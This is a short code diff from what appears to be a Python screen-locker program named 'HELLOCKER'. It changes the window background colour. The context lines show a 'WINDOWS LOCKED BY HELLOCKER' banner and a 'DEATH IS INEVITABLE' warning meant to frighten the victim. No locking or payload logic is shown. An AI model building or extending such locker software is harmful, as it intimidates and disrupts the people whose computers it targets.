@@ -54,7 +54,7 @@ def exiting():
 	messagebox.showwarning("HELLOCKER","DEATH IS INEVITABLE")
 wind = Tk()
 wind.title("HELLOCKER")
-wind["bg"] = "black"
+wind["bg"] = "blue"
 UNTEXD = Label(wind,bg="black", fg="red",text="WINDOWS LOCKED BY HELLOCKER\n\n\n", font="helvetica 75").pack()
 untex = Label(wind,bg="black", fg="red",text=lock_text, font="helvetica 40")
 untex.pack(side=TOP)
